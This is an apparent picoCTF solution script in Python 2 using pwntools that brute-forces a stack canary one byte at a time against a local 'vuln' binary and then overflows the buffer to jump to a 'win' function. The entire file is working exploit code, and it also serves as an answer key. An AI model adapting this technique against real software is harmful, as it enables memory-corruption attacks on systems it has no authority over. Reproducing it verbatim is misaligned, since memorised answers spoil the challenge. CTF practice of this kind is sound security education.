#!/usr/bin/env python2
import os
os.environ['PWNLIB_NOTERM'] = 'True'
import pwn

canarybytes = []
win = 0x080486eb #address of win

#find canary value
for i in range(4):
    for guess in range(256):
        t = pwn.process("./vuln")
        t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
        size = 32+1+i   # 33, 34, 35, 36 increases size by 1 each time a byte of the canary is guessed correctly
        t.sendline(str(size))
        t.recvuntil(b'Input> ')
        buf = 'h'*32
        for canarybyte in canarybytes:
            buf += chr(canarybyte)
        t.sendline(buf+chr(guess))
        if("Ok... Now Where's the Flag?\n" in t.recv()):
            canarybytes.append(guess)
            #print guess #debug statement
            t.close()
            break
        t.close()

#print canarybytes #debug statment

#typical buffer overflow now that we know the canary value
t = pwn.process("./vuln")
#pwn.gdb.attach(t) #useful if debugging on your own system, does not work well inside of picoCTF web shell.
t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
t.sendline("56")
t.recvuntil(b'Input> ')
buf = 'h'*32
for canarybyte in canarybytes:
    buf += chr(canarybyte)
buf += 'i'*16
buf += pwn.p32(win)
t.sendline(buf)
print t.recv()
